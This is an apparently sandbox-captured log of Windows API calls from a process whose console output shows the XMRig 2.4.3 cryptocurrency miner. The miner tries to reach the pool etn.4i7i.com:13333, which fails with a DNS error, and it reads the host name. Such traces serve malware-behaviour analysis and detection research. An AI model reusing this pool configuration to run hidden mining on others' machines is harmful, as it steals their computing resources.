NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.718
NtCreateSection,0x00000000#0x000000d0#0x000f0005#0x000000cc##8,0,1542888074.718
NtMapViewOfSection,8#0##0#0x01730000#0x000000d0#0xffffffff#2516#0#4096,0,1542888074.718
NtClose,0x000000d0,0,1542888074.718
NtUnmapViewOfSection,0xffffffff#2516#4096#0x01730000,0,1542888074.718
NtClose,0x000000cc,0,1542888074.718
NtUnmapViewOfSection,0xffffffff#2516#4096#0x755e0000,0,1542888074.718
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.718
NtQueryAttributesFile,C:\Windows\System32\wship6.dll#\??\C:\Windows\System32\wship6.dll,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.718
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.718
NtCreateFile,\??\C:\Windows\System32\wship6.dll#96#1#1#C:\Windows\System32\wship6.dll#5#0x80100080#0x000000cc#0,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.718
NtCreateSection,0x00000000#0x000000d0#0x00000007#0x000000cc##2,0,1542888074.718
NtMapViewOfSection,4#0##0#0x755e0000#0x000000d0#0xffffffff#2516#0#24576,0,1542888074.718
NtClose,0x000000d0,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\en-US\wship6.dll.mui#0#1#1#C:\Windows\System32\en-US\wship6.dll.mui#5#0x80100080#0x000000cc#0,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x000f0005#0x000000cc##8,0,1542888074.734
NtMapViewOfSection,8#0##0#0x01730000#0x000000d0#0xffffffff#2516#0#4096,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x01730000,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x755e0000,0,1542888074.734
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.734
NtQueryAttributesFile,C:\Windows\System32\wshqos.dll#\??\C:\Windows\System32\wshqos.dll,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.734
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\wshqos.dll#96#1#1#C:\Windows\System32\wshqos.dll#5#0x80100080#0x000000cc#0,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x00000007#0x000000cc##2,0,1542888074.734
NtMapViewOfSection,4#0##0#0x73ca0000#0x000000d0#0xffffffff#2516#0#24576,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\en-US\wshqos.dll.mui#0#1#1#C:\Windows\System32\en-US\wshqos.dll.mui#5#0x80100080#0x000000cc#0,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x000f0005#0x000000cc##8,0,1542888074.734
NtMapViewOfSection,8#0##0#0x01730000#0x000000d0#0xffffffff#2516#0#4096,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x01730000,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x73ca0000,0,1542888074.734
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.734
NtQueryAttributesFile,C:\Windows\System32\wshqos.dll#\??\C:\Windows\System32\wshqos.dll,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.734
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\wshqos.dll#96#1#1#C:\Windows\System32\wshqos.dll#5#0x80100080#0x000000cc#0,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x00000007#0x000000cc##2,0,1542888074.734
NtMapViewOfSection,4#0##0#0x73ca0000#0x000000d0#0xffffffff#2516#0#24576,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\en-US\wshqos.dll.mui#0#1#1#C:\Windows\System32\en-US\wshqos.dll.mui#5#0x80100080#0x000000cc#0,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x000f0005#0x000000cc##8,0,1542888074.734
NtMapViewOfSection,8#0##0#0x01730000#0x000000d0#0xffffffff#2516#0#4096,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x01730000,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x73ca0000,0,1542888074.734
NtQueryAttributesFile,C:\Windows\System32\wshqos.dll#\??\C:\Windows\System32\wshqos.dll,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\wshqos.dll#96#1#1#C:\Windows\System32\wshqos.dll#5#0x80100080#0x000000cc#0,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x00000007#0x000000cc##2,0,1542888074.734
NtMapViewOfSection,4#0##0#0x73ca0000#0x000000d0#0xffffffff#2516#0#24576,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\en-US\wshqos.dll.mui#0#1#1#C:\Windows\System32\en-US\wshqos.dll.mui#5#0x80100080#0x000000cc#0,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x000f0005#0x000000cc##8,0,1542888074.734
NtMapViewOfSection,8#0##0#0x01730000#0x000000d0#0xffffffff#2516#0#4096,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x01730000,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x73ca0000,0,1542888074.734
NtQueryAttributesFile,C:\Windows\System32\wshqos.dll#\??\C:\Windows\System32\wshqos.dll,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\wshqos.dll#96#1#1#C:\Windows\System32\wshqos.dll#5#0x80100080#0x000000cc#0,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x00000007#0x000000cc##2,0,1542888074.734
NtMapViewOfSection,4#0##0#0x73ca0000#0x000000d0#0xffffffff#2516#0#24576,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtCreateFile,\??\C:\Windows\System32\en-US\wshqos.dll.mui#0#1#1#C:\Windows\System32\en-US\wshqos.dll.mui#5#0x80100080#0x000000cc#0,0,1542888074.734
NtCreateSection,0x00000000#0x000000d0#0x000f0005#0x000000cc##8,0,1542888074.734
NtMapViewOfSection,8#0##0#0x01730000#0x000000d0#0xffffffff#2516#0#4096,0,1542888074.734
NtClose,0x000000d0,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x01730000,0,1542888074.734
NtClose,0x000000cc,0,1542888074.734
NtUnmapViewOfSection,0xffffffff#2516#4096#0x73ca0000,0,1542888074.734
closesocket,196,0,1542888074.734
socket,1#0#196#23,196,1542888074.734
closesocket,196,0,1542888074.734
NtCreateThreadEx,0x001fffff#3#0x000000d4#0#0xffffffff#0x77a5fd0d#2516#0x00314158#0x0022fabc,0,1542888074.734
NtDuplicateObject,0x000000d8#0xffffffff#2516#6#0xffffffff#0x00000000#2516#0#0x000000d4,0,1542888074.734
NtResumeThread,2516#1#0x000000d4,0,1542888074.734
LdrGetDllHandle,0#ntdll.dll#0x77a30000,0,1542888074.734
LdrGetProcedureAddress,ntdll#0x77a965b3#0#0x77a30000#RtlGetVersion,0,1542888074.734
GetSystemTimeAsFileTime,,0,1542888074.734
NtAllocateVirtualMemory,0#0#16384#4096#0xffffffff#0#2516#0x006aa000#4,0,1542888074.734
NtAllocateVirtualMemory,0#0#1048576#8192#0xffffffff#0#2516#0x01b30000#4,0,1542888074.734
NtAllocateVirtualMemory,0#0#32768#4096#0xffffffff#0#2516#0x01b30000#4,0,1542888074.734
NtAllocateVirtualMemory,0#0#4198400#4096#0xffffffff#0#2516#0x01c30000#4,0,1542888074.734
NtFreeVirtualMemory,0xffffffff#2516#4198400#0x01c30000#32768,0,1542888074.75
LookupPrivilegeValueW,SeLockMemoryPrivilege#,1,1542888074.75
NtClose,0x0000011c,0,1542888074.75
GetSystemTimeAsFileTime,,0,1542888075.859
LdrGetDllHandle,0#msvcrt.dll#0x77bb0000,0,1542888075.859
LdrGetProcedureAddress,msvcrt#0x77bc7402#0#0x77bb0000#_localtime32_s,0,1542888075.859
GetTimeZoneInformation,,1,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,[2018-11-22 21:41:15]#0x0000000f,1,1542888075.859
LookupPrivilegeValueW,SeLockMemoryPrivilege#,1,1542888075.859
NtAllocateVirtualMemory,0#0#4194304#536883200#0xffffffff#0#2516#0x00000000#4,3221225569,1542888075.859
NtAllocateVirtualMemory,0#0#4198400#4096#0xffffffff#0#2516#0x01c30000#4,0,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,#0x0000000f,1,1542888075.859
WriteConsoleW, * #0x0000000f,1,1542888075.859
WriteConsoleW,VERSIONS:     #0x0000000f,1,1542888075.859
WriteConsoleW,XMRig/2.4.3#0x0000000f,1,1542888075.859
WriteConsoleW, libuv/1.14.1 gcc/7.2.0#0x0000000f,1,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,#0x0000000f,1,1542888075.859
WriteConsoleW, * #0x0000000f,1,1542888075.859
WriteConsoleW,HUGE PAGES:   #0x0000000f,1,1542888075.859
WriteConsoleW,disabled#0x0000000f,1,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,#0x0000000f,1,1542888075.859
WriteConsoleW, * #0x0000000f,1,1542888075.859
WriteConsoleW,CPU:          Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz (1) #0x0000000f,1,1542888075.859
WriteConsoleW,-x64 #0x0000000f,1,1542888075.859
WriteConsoleW,AES-NI#0x0000000f,1,1542888075.859
LdrGetDllHandle,0#msvcrt.dll#0x77bb0000,0,1542888075.859
LdrGetProcedureAddress,msvcrt#0x77bc0653#0#0x77bb0000#___lc_codepage_func,0,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,#0x0000000f,1,1542888075.859
WriteConsoleW, * #0x0000000f,1,1542888075.859
WriteConsoleW,CPU L2/L3:    0.2 MB/8.0 MB#0x0000000f,1,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,#0x0000000f,1,1542888075.859
WriteConsoleW, * #0x0000000f,1,1542888075.859
WriteConsoleW,THREADS:      #0x0000000f,1,1542888075.859
WriteConsoleW,1#0x0000000f,1,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,#0x0000000f,1,1542888075.859
WriteConsoleW, * #0x0000000f,1,1542888075.859
WriteConsoleW,POOL #1:      #0x0000000f,1,1542888075.859
WriteConsoleW,etn.4i7i.com:13333#0x0000000f,1,1542888075.859
GetFileType,0x00000007,2,1542888075.859
WriteConsoleW,#0x0000000f,1,1542888075.859
WriteConsoleW, * #0x0000000f,1,1542888075.859
WriteConsoleW,COMMANDS:     #0x0000000f,1,1542888075.859
WriteConsoleW,h#0x0000000f,1,1542888075.859
WriteConsoleW,p#0x0000000f,1,1542888075.859
WriteConsoleW,r#0x0000000f,1,1542888075.859
WriteConsoleW,esume#0x0000000f,1,1542888075.859
NtAllocateVirtualMemory,0#0#1572864#8192#0xffffffff#0#2516#0x02040000#4,0,1542888075.875
NtFreeVirtualMemory,0xffffffff#2516#1507328#0x02040000#32768,0,1542888075.875
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#2516#0x021b0000#4,0,1542888075.875
LdrLoadDll,0#0#C:\Windows\system32\NLAapi.dll#0x74270000#NLAapi,0,1542888075.875
LdrGetProcedureAddress,NLAapi#0x74275d11#0#0x74270000#NSPStartup,0,1542888075.875
NtAllocateVirtualMemory,0#0#262144#8192#0xffffffff#0#2516#0x02040000#4,0,1542888075.875
NtFreeVirtualMemory,0xffffffff#2516#196608#0x02040000#32768,0,1542888075.875
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#2516#0x02070000#4,0,1542888075.875
NtAllocateVirtualMemory,0#0#8192#4096#0xffffffff#0#2516#0x006ae000#4,0,1542888075.875
LdrLoadDll,0#0#C:\Windows\system32\napinsp.dll#0x6f120000#napinsp,0,1542888075.875
LdrGetProcedureAddress,napinsp#0x6f121d20#0#0x6f120000#NSPStartup,0,1542888075.875
LdrLoadDll,0#0#API-MS-Win-Security-SDDL-L1-1-0.dll#0x77b80000#API-MS-Win-Security-SDDL-L1-1-0,0,1542888075.875
LdrGetProcedureAddress,sechost#0x77b8e093#0#0x77b80000#ConvertStringSecurityDescriptorToSecurityDescriptorW,0,1542888075.875
LdrLoadDll,0#0#C:\Windows\system32\pnrpnsp.dll#0x6e300000#pnrpnsp,0,1542888075.875
LdrGetProcedureAddress,pnrpnsp#0x6e30221a#0#0x6e300000#NSPStartup,0,1542888075.875
LdrLoadDll,0#0#C:\Windows\system32\pnrpnsp.dll#0x6e300000#pnrpnsp,0,1542888075.875
LdrGetProcedureAddress,pnrpnsp#0x6e30221a#0#0x6e300000#NSPStartup,0,1542888075.875
LdrLoadDll,0#0#C:\Windows\System32\mswsock.dll#0x755f0000#mswsock,0,1542888075.875
LdrGetProcedureAddress,mswsock#0x755f9a1d#0#0x755f0000#NSPStartup,0,1542888075.875
NtAllocateVirtualMemory,0#0#1572864#8192#0xffffffff#0#2516#0x021c0000#4,0,1542888075.875
NtFreeVirtualMemory,0xffffffff#2516#1310720#0x021c0000#32768,0,1542888075.875
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#2516#0x02300000#4,0,1542888075.875
LdrLoadDll,0#0#DNSAPI.dll#0x754b0000#DNSAPI,0,1542888075.875
LdrGetProcedureAddress,DNSAPI#0x754c6e3a#0#0x754b0000#DnsQueryConfigAllocEx,0,1542888075.875
RegCreateKeyExW,0#0x00020019#0x00000190#Class#0x80000002#2#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters#System\CurrentControlSet\Services\Tcpip\Parameters,0,1542888075.875
RegOpenKeyExW,0#System\CurrentControlSet\Services\DnsCache\Parameters#0x00000194#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\DnsCache\Parameters,0,1542888075.875
RegOpenKeyExW,0#Software\Policies\Microsoft\Windows NT\DnsClient#0x00000000#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\DnsClient,2,1542888075.875
RegQueryValueExW,#Hostname#0x00000190#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Hostname,0,1542888075.875
RegQueryValueExW,mag-PC#Hostname#0x00000190#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Hostname,0,1542888075.875
RegCloseKey,0x00000190,0,1542888075.875
RegCloseKey,0x00000194,0,1542888075.875
RegCreateKeyExW,0#0x00020019#0x00000194#Class#0x80000002#2#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters#System\CurrentControlSet\Services\Tcpip\Parameters,0,1542888075.875
RegOpenKeyExW,0#System\CurrentControlSet\Services\DnsCache\Parameters#0x00000190#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\DnsCache\Parameters,0,1542888075.875
RegOpenKeyExW,0#Software\Policies\Microsoft\Windows NT\DnsClient#0x00000000#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\DnsClient,2,1542888075.875
RegQueryValueExW,#Hostname#0x00000194#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Hostname,0,1542888075.875
RegQueryValueExW,mag-PC#Hostname#0x00000194#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Hostname,0,1542888075.875
RegCloseKey,0x00000194,0,1542888075.875
RegCloseKey,0x00000190,0,1542888075.875
RegCreateKeyExW,0#0x00020019#0x00000190#Class#0x80000002#2#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters#System\CurrentControlSet\Services\Tcpip\Parameters,0,1542888075.875
RegOpenKeyExW,0#System\CurrentControlSet\Services\DnsCache\Parameters#0x00000194#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\DnsCache\Parameters,0,1542888075.875
RegOpenKeyExW,0#Software\Policies\Microsoft\Windows NT\DnsClient#0x00000000#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\DnsClient,2,1542888075.875
RegOpenKeyExW,0#Software\Policies\Microsoft\System\DNSClient#0x00000000#0x80000002#0x00000001#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\System\DNSClient,2,1542888075.875
RegQueryValueExW,#Domain#0x00000190#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Domain,0,1542888075.875
RegQueryValueExW,#Domain#0x00000190#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Domain,0,1542888075.875
RegCloseKey,0x00000190,0,1542888075.875
RegCloseKey,0x00000194,0,1542888075.875
LdrLoadDll,0#0#C:\Windows\System32\winrnr.dll#0x6e2f0000#winrnr,0,1542888075.875
LdrGetProcedureAddress,winrnr#0x6e2f16b4#0#0x6e2f0000#NSPStartup,0,1542888075.875
LdrLoadDll,0#0#WS2_32.dll#0x75f90000#WS2_32,0,1542888075.875
LdrGetProcedureAddress,WS2_32#0x75f937d9#112#0x75f90000#,0,1542888075.875
LdrGetProcedureAddress,WS2_32#0x75f937ad#111#0x75f90000#,0,1542888075.875
LdrGetProcedureAddress,DNSAPI#0x754b31c3#0#0x754b0000#DnsApiAlloc,0,1542888075.875
RegCreateKeyExW,0#0x00020019#0x00000194#Class#0x80000002#2#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters#System\CurrentControlSet\Services\Tcpip\Parameters,0,1542888075.875
RegOpenKeyExW,0#System\CurrentControlSet\Services\DnsCache\Parameters#0x00000190#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\DnsCache\Parameters,0,1542888075.875
RegOpenKeyExW,0#Software\Policies\Microsoft\Windows NT\DnsClient#0x00000000#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\DnsClient,2,1542888075.875
RegQueryValueExW,#Hostname#0x00000194#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Hostname,0,1542888075.875
RegQueryValueExW,mag-PC#Hostname#0x00000194#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services\Tcpip\Parameters\Hostname,0,1542888075.875
RegCloseKey,0x00000194,0,1542888075.875
RegCloseKey,0x00000190,0,1542888075.875
LdrGetProcedureAddress,DNSAPI#0x754b314b#0#0x754b0000#DnsApiFree,0,1542888075.875
GetAdaptersAddresses,14#0,111,1542888075.875
GetAdaptersAddresses,14#0,0,1542888075.875
NtAllocateVirtualMemory,0#0#36864#4096#0xffffffff#0#2516#0x01b38000#4,0,1542888075.875
NtAllocateVirtualMemory,0#0#36864#4096#0xffffffff#0#2516#0x01b41000#4,0,1542888075.875
CreateThread,1284#0x01b47120#4#0x77bc12e5#0,420,1542888075.89
NtResumeThread,2516#1#0x000001a4,0,1542888075.89
CreateThread,2904#0x01b473a0#4#0x77bc12e5#0,428,1542888075.89
NtResumeThread,2516#1#0x000001ac,0,1542888075.89
CreateThread,3084#0x01b475d8#4#0x77bc12e5#0,432,1542888075.89
NtResumeThread,2516#1#0x000001b0,0,1542888075.89
CreateThread,3936#0x01b47810#4#0x77bc12e5#0,436,1542888075.89
NtResumeThread,2516#1#0x000001b4,0,1542888075.89
CreateThread,2948#0x01b47a48#4#0x77bc12e5#0,440,1542888075.89
NtResumeThread,2516#1#0x000001b8,0,1542888075.89
GetSystemTimeAsFileTime,,0,1542888075.89
NtDuplicateObject,0x000001c4#0xffffffff#2516#2#0xffffffff#0x00000000#2516#0#0xfffffffe,0,1542888075.89
GetSystemTimeAsFileTime,,0,1542888076.093
GetSystemTimeAsFileTime,,0,1542888076.296
GetSystemTimeAsFileTime,,0,1542888076.39
GetSystemTimeAsFileTime,,0,1542888076.39
GetSystemTimeAsFileTime,,0,1542888076.39
GetSystemTimeAsFileTime,,0,1542888076.39
GetSystemTimeAsFileTime,,0,1542888076.39
GetSystemTimeAsFileTime,,0,1542888076.39
GetSystemTimeAsFileTime,,0,1542888076.39
GetSystemTimeAsFileTime,,0,1542888076.5
GetSystemTimeAsFileTime,,0,1542888076.703
GetSystemTimeAsFileTime,,0,1542888076.89
GetSystemTimeAsFileTime,,0,1542888076.89
GetSystemTimeAsFileTime,,0,1542888076.89
GetSystemTimeAsFileTime,,0,1542888076.89
GetSystemTimeAsFileTime,,0,1542888076.89
GetSystemTimeAsFileTime,,0,1542888076.89
GetSystemTimeAsFileTime,,0,1542888076.906
GetSystemTimeAsFileTime,,0,1542888077.109
GetSystemTimeAsFileTime,,0,1542888077.312
GetSystemTimeAsFileTime,,0,1542888077.515
GetSystemTimeAsFileTime,,0,1542888077.718
GetSystemTimeAsFileTime,,0,1542888077.921
GetSystemTimeAsFileTime,,0,1542888077.921
GetSystemTimeAsFileTime,,0,1542888077.921
GetSystemTimeAsFileTime,,0,1542888077.921
GetSystemTimeAsFileTime,,0,1542888077.921
GetSystemTimeAsFileTime,,0,1542888077.921
GetSystemTimeAsFileTime,,0,1542888077.921
GetSystemTimeAsFileTime,,0,1542888078.125
GetAddrInfoW,etn.4i7i.com#,11001,1542888078.14
GetSystemTimeAsFileTime,,0,1542888078.14
GetFileType,0x00000007,2,1542888078.14
WriteConsoleW,[2018-11-22 21:41:18]#0x0000000f,1,1542888078.14
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888078.14
GetSystemTimeAsFileTime,,0,1542888078.328
GetSystemTimeAsFileTime,,0,1542888078.531
GetSystemTimeAsFileTime,,0,1542888078.734
GetSystemTimeAsFileTime,,0,1542888078.937
GetSystemTimeAsFileTime,,0,1542888079.015
GetSystemTimeAsFileTime,,0,1542888079.015
GetSystemTimeAsFileTime,,0,1542888079.015
GetSystemTimeAsFileTime,,0,1542888079.015
GetSystemTimeAsFileTime,,0,1542888079.015
GetSystemTimeAsFileTime,,0,1542888079.015
GetSystemTimeAsFileTime,,0,1542888079.14
GetSystemTimeAsFileTime,,0,1542888079.343
GetSystemTimeAsFileTime,,0,1542888079.546
GetSystemTimeAsFileTime,,0,1542888079.75
GetSystemTimeAsFileTime,,0,1542888079.781
GetSystemTimeAsFileTime,,0,1542888079.781
GetSystemTimeAsFileTime,,0,1542888079.781
GetSystemTimeAsFileTime,,0,1542888079.781
GetSystemTimeAsFileTime,,0,1542888079.781
GetSystemTimeAsFileTime,,0,1542888079.781
GetSystemTimeAsFileTime,,0,1542888079.953
GetSystemTimeAsFileTime,,0,1542888080.156
GetSystemTimeAsFileTime,,0,1542888080.281
GetSystemTimeAsFileTime,,0,1542888080.281
GetSystemTimeAsFileTime,,0,1542888080.281
GetSystemTimeAsFileTime,,0,1542888080.281
GetSystemTimeAsFileTime,,0,1542888080.281
GetSystemTimeAsFileTime,,0,1542888080.281
GetSystemTimeAsFileTime,,0,1542888080.359
GetSystemTimeAsFileTime,,0,1542888080.562
GetSystemTimeAsFileTime,,0,1542888080.765
GetSystemTimeAsFileTime,,0,1542888080.796
GetSystemTimeAsFileTime,,0,1542888080.796
GetSystemTimeAsFileTime,,0,1542888080.796
GetSystemTimeAsFileTime,,0,1542888080.796
GetSystemTimeAsFileTime,,0,1542888080.796
GetSystemTimeAsFileTime,,0,1542888080.796
GetSystemTimeAsFileTime,,0,1542888080.968
GetSystemTimeAsFileTime,,0,1542888081.171
GetSystemTimeAsFileTime,,0,1542888081.312
GetSystemTimeAsFileTime,,0,1542888081.312
GetSystemTimeAsFileTime,,0,1542888081.312
GetSystemTimeAsFileTime,,0,1542888081.312
GetSystemTimeAsFileTime,,0,1542888081.312
GetSystemTimeAsFileTime,,0,1542888081.312
GetSystemTimeAsFileTime,,0,1542888081.375
GetSystemTimeAsFileTime,,0,1542888081.578
GetSystemTimeAsFileTime,,0,1542888081.781
GetSystemTimeAsFileTime,,0,1542888081.828
GetSystemTimeAsFileTime,,0,1542888081.828
GetSystemTimeAsFileTime,,0,1542888081.828
GetSystemTimeAsFileTime,,0,1542888081.828
GetSystemTimeAsFileTime,,0,1542888081.828
GetSystemTimeAsFileTime,,0,1542888081.828
GetSystemTimeAsFileTime,,0,1542888081.984
GetSystemTimeAsFileTime,,0,1542888082.187
GetSystemTimeAsFileTime,,0,1542888082.328
GetSystemTimeAsFileTime,,0,1542888082.328
GetSystemTimeAsFileTime,,0,1542888082.328
GetSystemTimeAsFileTime,,0,1542888082.328
GetSystemTimeAsFileTime,,0,1542888082.328
GetSystemTimeAsFileTime,,0,1542888082.328
GetSystemTimeAsFileTime,,0,1542888082.39
GetSystemTimeAsFileTime,,0,1542888082.593
GetSystemTimeAsFileTime,,0,1542888082.796
GetSystemTimeAsFileTime,,0,1542888082.843
GetSystemTimeAsFileTime,,0,1542888082.843
GetSystemTimeAsFileTime,,0,1542888082.843
GetSystemTimeAsFileTime,,0,1542888082.843
GetSystemTimeAsFileTime,,0,1542888082.843
GetSystemTimeAsFileTime,,0,1542888082.843
GetSystemTimeAsFileTime,,0,1542888083.0
GetSystemTimeAsFileTime,,0,1542888083.203
GetSystemTimeAsFileTime,,0,1542888083.359
GetSystemTimeAsFileTime,,0,1542888083.359
GetSystemTimeAsFileTime,,0,1542888083.359
GetSystemTimeAsFileTime,,0,1542888083.359
GetSystemTimeAsFileTime,,0,1542888083.359
GetSystemTimeAsFileTime,,0,1542888083.359
GetSystemTimeAsFileTime,,0,1542888083.406
GetSystemTimeAsFileTime,,0,1542888083.609
GetSystemTimeAsFileTime,,0,1542888083.812
GetSystemTimeAsFileTime,,0,1542888083.859
GetSystemTimeAsFileTime,,0,1542888083.859
GetSystemTimeAsFileTime,,0,1542888083.859
GetSystemTimeAsFileTime,,0,1542888083.859
GetSystemTimeAsFileTime,,0,1542888083.859
GetSystemTimeAsFileTime,,0,1542888083.859
GetSystemTimeAsFileTime,,0,1542888084.015
GetSystemTimeAsFileTime,,0,1542888084.218
GetSystemTimeAsFileTime,,0,1542888084.39
GetSystemTimeAsFileTime,,0,1542888084.39
GetSystemTimeAsFileTime,,0,1542888084.39
GetSystemTimeAsFileTime,,0,1542888084.39
GetSystemTimeAsFileTime,,0,1542888084.39
GetSystemTimeAsFileTime,,0,1542888084.39
GetSystemTimeAsFileTime,,0,1542888084.421
GetSystemTimeAsFileTime,,0,1542888084.625
GetSystemTimeAsFileTime,,0,1542888084.828
GetSystemTimeAsFileTime,,0,1542888084.875
GetSystemTimeAsFileTime,,0,1542888084.875
GetSystemTimeAsFileTime,,0,1542888084.875
GetSystemTimeAsFileTime,,0,1542888084.875
GetSystemTimeAsFileTime,,0,1542888084.875
GetSystemTimeAsFileTime,,0,1542888084.875
GetSystemTimeAsFileTime,,0,1542888085.031
GetSystemTimeAsFileTime,,0,1542888085.234
GetSystemTimeAsFileTime,,0,1542888085.421
GetSystemTimeAsFileTime,,0,1542888085.421
GetSystemTimeAsFileTime,,0,1542888085.421
GetSystemTimeAsFileTime,,0,1542888085.421
GetSystemTimeAsFileTime,,0,1542888085.421
GetSystemTimeAsFileTime,,0,1542888085.421
GetSystemTimeAsFileTime,,0,1542888085.437
GetSystemTimeAsFileTime,,0,1542888085.64
